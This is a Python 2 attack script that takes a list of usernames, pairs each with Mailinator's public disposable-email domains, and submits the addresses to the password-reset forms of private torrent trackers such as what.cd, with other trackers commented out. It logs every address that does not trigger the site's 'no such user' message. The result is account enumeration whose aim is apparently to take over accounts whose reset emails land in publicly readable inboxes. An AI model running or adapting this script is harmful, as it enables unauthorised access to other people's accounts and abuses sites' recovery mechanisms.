import urllib
import urllib2
import logging
import sys

# all of mailinator's aliases: 
maildomains = [
    'mailinator.com',
    'mailinator2.com',
    'sogetthis.com',
    'mailin8r.com',
    'mailinator.net',
    'spamherelots.com',
    'thisisnotmyrealemail.com'
    ]

"""
tgtsites is an array of arrays.  each sub-array contains 5 fields:
1) name of site
2) URL to 'forgot password' action
3) Request parameter name that holds the username for 'forgot password' action
4) An array holding other parameters and their values for the same action
5) The string to search for in the response that means 'no such user'
"""
tgtsites = [
    ['what.cd', 'http://what.cd/login.php?act=recover', 'email', 
        ['reset=Reset!'], 'There is no user with that email address.']
#    ['stmusic', 'http://www.stmusic.org/recover.php', 'email', 
#        [], 'was not found in the database.'],
#    ['demonoid', 'http://www.demonoid.com/password_retrieval.php', 'pass_email', 
#        ['Submit=Submit'], 'email address provided was not used to register'],
#    ['empornium', 'http://empornium.us/takeforgotpass.php', 'email', 
#        [], 'No username found matching your email address'],
#    ['tvtorrents', 'http://www.tvtorrents.com/lostpassword.do', 'email', 
#        ['posted=true'], 'Your email could not be found in the database']
]

cookies = urllib2.HTTPCookieProcessor()
opener = urllib2.build_opener(cookies)

logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s %(message)s',
                    filename='forgotpwd.log',
                    filemode='w')

if len(sys.argv) < 2:
    print "usage: "+sys.argv[0]+" <username list>"
    sys.exit(0)
userlist = sys.argv[1]

try:
    FILE = open(userlist, "r")
    user = FILE.readline().strip()
    
    while user and len(user) > 0:
        for tgtsite in tgtsites:
            for maildomain in maildomains:
                print user+"@"+maildomain+" has forgotten his password at "+tgtsite[0]

                values = {}
                values[tgtsite[2]] = user + '@' + maildomain
                for p in tgtsite[3]:
                    pair = p.split("=")
                    values[pair[0]] = pair[1]
                 
                data = urllib.urlencode(values)
                post = urllib2.Request(tgtsite[1], data)
                resp = opener.open(post)
                txt = resp.read()
                
                qstr = tgtsite[4]
                x = txt.find(qstr)
                if x > 0:
                    print 'No Luck.'
                else:
                    print 'JOY!!!'
                    logging.debug('JOY: '+user+'@'+maildomain+' at '+tgtsite[0])
                    logging.debug(txt)
                
        user = FILE.readline().strip()
    FILE.close()

except IOError,e:
    print "Failed to open url"
    if hasattr(e, "code"):
        print "We failed with error code - %s." % e.code
    elif hasattr(e, 'reason'):
        print "The error object has the following 'reason' attribute :"
        print e.reason
        print "This usually means the server doesn't exist,"
        print "is down, or we don't have an internet connection."
    sys.exit()
